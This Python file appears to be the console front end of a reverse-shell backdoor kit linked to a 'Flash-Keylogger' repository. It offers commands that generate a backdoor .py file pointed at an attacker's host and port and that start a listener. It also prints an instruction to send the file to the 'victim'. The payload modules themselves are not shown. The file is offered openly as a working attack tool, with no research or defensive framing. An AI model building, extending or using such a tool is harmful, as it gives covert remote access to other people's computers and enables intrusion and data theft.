import platform

import client_side
import server_side
from termcolor import colored
import os


def flashconsole():
    print(colored('[+] STARTING FLASHCONSOLE [+]', 'blue'))
    console_running = True
    while console_running:
        input_command = input("flashconsole > ")
        # Flashex for Flash Exploit
        if 'flashex --create' in input_command:
            command_parts = input_command.split(" ")
            target_host = command_parts[2]
            target_port = command_parts[3]
            create_rs(target_host, target_port)
        elif 'flashex --listen' in input_command:
            command_parts = input_command.split(" ")
            listening_port = command_parts[2]
            listen_rs(int(listening_port))


def create_rs(target_host, target_port):
    # Ask User desired File Name for the .py backdoor
    print('How do you want to name the file?')
    file_name = input()
    # Ask User desired path for mentioned File
    print('Where do you want to store the output files?')
    path_input = input()
    # Declare complete variable consisting of path to end-directory and file name
    complete_path = ''
    # Check if path exists, if yes set path
    if os.path.exists(path_input):
        path = path_input
        # Check if file already exists
        if os.path.isfile(path + file_name):
            print(colored('File already exists, please choose another name!', 'red'))
        else:
            # Set the complete path of the backdoor file
            if platform.system() == 'Windows':
                complete_path = path + '\\' + file_name
            elif platform.system() == 'Linux':
                complete_path = path + '/' + file_name
        # And finally, run the client side main function to write backdoor file
        client_side.main(target_host, target_port, complete_path)
        if os.path.isfile(complete_path):
            print(colored('Successfully executed, please send python file to victim after you set up listener.', 'green'))
        else:
            print(colored('Could not create File. An Error has occurred!', 'red'))

    else:
        print(colored('Path "' + path_input + '" doesnt exist!', 'red'))


def listen_rs(listening_port):
    server_side.main(listening_port)


print(colored('WELCOME TO FLASHCONSOLE!', 'blue'))
print(colored('For documentation on commands and uses, please visit the following repository:'))
print("https://github.com/FujiwaraChoki/Flash-Keylogger")

flashconsole()
